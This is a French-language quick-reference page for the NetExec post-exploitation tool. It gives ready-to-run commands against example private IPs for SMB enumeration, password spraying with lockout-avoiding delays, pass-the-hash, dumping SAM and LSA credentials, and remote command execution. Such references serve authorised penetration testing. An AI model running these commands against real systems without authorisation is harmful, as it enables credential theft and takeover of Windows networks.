# 🌐 NetExec (nxc) - Network Execution Tool

## Description

NetExec (anciennement CrackMapExec) est un outil post-exploitation réseau pour Windows/Active Directory.

**Fonctionnalités :**
- Énumération SMB/LDAP/WinRM/SSH
- Password spraying
- Pass-the-Hash
- Exécution de commandes
- Dump credentials

---

## Installation

✅ **Déjà installé dans Kali Headless**

```bash
nxc --version
```

---

## Exemples pratiques

### SMB enumeration

```bash
# Scanner subnet
nxc smb 192.168.1.0/24

# Avec credentials
nxc smb 192.168.1.0/24 -u admin -p 'Password123!'

# Pass-the-Hash
nxc smb 192.168.1.0/24 -u admin -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```

### Password spraying

```bash
# Tester un mot de passe sur tous les comptes
nxc smb 192.168.1.100 -u users.txt -p 'Winter2024!'

# Avec délai (éviter lockout)
nxc smb 192.168.1.100 -u users.txt -p 'Password123!' --delay 5
```

### Dump SAM/LSA

```bash
# Dumper SAM
nxc smb 192.168.1.100 -u admin -p pass --sam

# Dumper LSA
nxc smb 192.168.1.100 -u admin -p pass --lsa
```

### Exécution de commandes

```bash
# Exécuter commande
nxc smb 192.168.1.100 -u admin -p pass -x "whoami"

# PowerShell
nxc smb 192.168.1.100 -u admin -p pass -X '$PSVersionTable'
```

---

## Ressources

- [NetExec GitHub](https://github.com/Pennyw0rth/NetExec)
